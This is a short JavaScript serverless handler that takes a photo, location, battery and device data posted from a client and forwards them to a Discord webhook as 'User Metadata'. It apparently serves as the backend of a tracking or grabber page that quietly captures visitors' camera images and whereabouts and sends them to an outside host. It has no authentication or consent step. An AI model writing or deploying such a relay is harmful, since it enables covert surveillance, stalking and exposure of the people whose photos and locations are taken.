export default async function handler(req,res){
  if(req.method !== "POST"){
    return res.status(405).send("Method Not Allowed");
  }
  const webhookUrl = process.env.DISCORD_WEBHOOK;
  if(!webhookUrl) return res.status(500).send("Webhook not set");

  const data = req.body; // { photo, location, battery, device }

  let content = "";
  if(data.location || data.battery || data.device){
    content += "=== User Metadata ===\n";
    if(data.location) content += JSON.stringify(data.location, null, 2) + "\n";
    if(data.battery) content += JSON.stringify(data.battery, null, 2) + "\n";
    if(data.device) content += JSON.stringify(data.device, null, 2) + "\n";
  }

  const form = new FormData();
  if(data.photo){
    const buffer = Buffer.from(data.photo.split(",")[1], "base64");
    form.append("file", buffer, `photo_${Date.now()}.jpg`);
  }
  if(content) form.append("content", content);

  await fetch(webhookUrl, { method:"POST", body: form });
  res.status(200).send("Sent");
}
